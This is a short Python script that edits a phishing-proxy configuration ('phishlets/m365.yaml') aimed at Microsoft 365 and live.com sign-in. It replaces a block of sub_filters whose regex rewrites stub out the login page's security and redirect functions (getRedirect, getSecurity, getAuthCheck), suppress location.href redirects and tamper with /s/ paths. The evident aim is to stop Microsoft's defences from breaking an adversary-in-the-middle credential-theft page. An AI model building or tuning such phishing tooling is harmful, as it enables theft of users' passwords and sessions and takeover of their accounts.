import os

file_path = "phishlets/m365.yaml"

new_block = """sub_filters:
  # UNIVERSAL getRedirect + security function blocker
  - {
      triggers_on: "login",
      orig_sub: "",
      domain: "live.com",
      search: 'function\\s+(getRedirect|getSecurity|getAuthCheck)',
      replace: 'function $1(){console.log("Security blocked");}',
      mimes: ["application/javascript"],
      regex: true
    }
  # UNIVERSAL location.href blocker  
  - {
      triggers_on: "login",
      orig_sub: "",
      domain: "live.com",
      search: '(top|parent|window)\\.location\\.href\\s*=',
      replace: 'console.log("Redirect blocked:",',
      mimes: ["application/javascript"],
      regex: true
    }
  # Block ALL /s/ paths
  - {
      triggers_on: "login",
      orig_sub: "",
      domain: "live.com", 
      search: '(\\/s\\/[a-f0-9]{64})',
      replace: '$1?blocked',
      mimes: ["application/javascript", "text/html"],
      regex: true"""

# Using 'utf-8-sig' to handle potential BOM like UTF-8-BOM or just standard UTF-8
try:
    with open(file_path, "r", encoding="utf-8") as f:
        content = f.read()
except UnicodeDecodeError:
    # Fallback to cp1252 if utf-8 fails
    with open(file_path, "r", encoding="cp1252") as f:
        content = f.read()

bad_block = """sub_filters:
  # UNIVERSAL getRedirect + security function blocker
  - {
      triggers_on: ["login.live.com", "microsoft.com", "microsoftonline.com", "office.com"],
      orig_sub: "",
      domain: "live.com",
      search: 'function\\s+(getRedirect|getSecurity|getAuthCheck)',
      replace: 'function $1(){console.log("Security blocked");}',
      mimes: ["application/javascript"],
      regex: true
    }
  # UNIVERSAL location.href blocker  
  - {
      triggers_on: ["login.live.com", "microsoft.com", "microsoftonline.com", "office.com"],
      orig_sub: "",
      domain: "live.com",
      search: '(top|parent|window)\\.location\\.href\\s*=',
      replace: 'console.log("Redirect blocked:",',
      mimes: ["application/javascript"],
      regex: true
    }
  # Block ALL /s/ paths
  - {
      triggers_on: ["login.live.com", "microsoft.com", "microsoftonline.com", "office.com"],
      orig_sub: "",
      domain: "live.com", 
      search: '(\\/s\\/[a-f0-9]{64})',
      replace: '$1?blocked',
      mimes: ["application/javascript", "text/html"],
      regex: true"""

if bad_block in content:
    new_content = content.replace(bad_block, new_block)
    # Write back in UTF-8
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(new_content)
    print("Successfully replaced content.")
else:
    print("Could not find the exact block to replace. Dumping content snippet for debug:")
    # Print a safe snippet
    print(content[1800:2200])
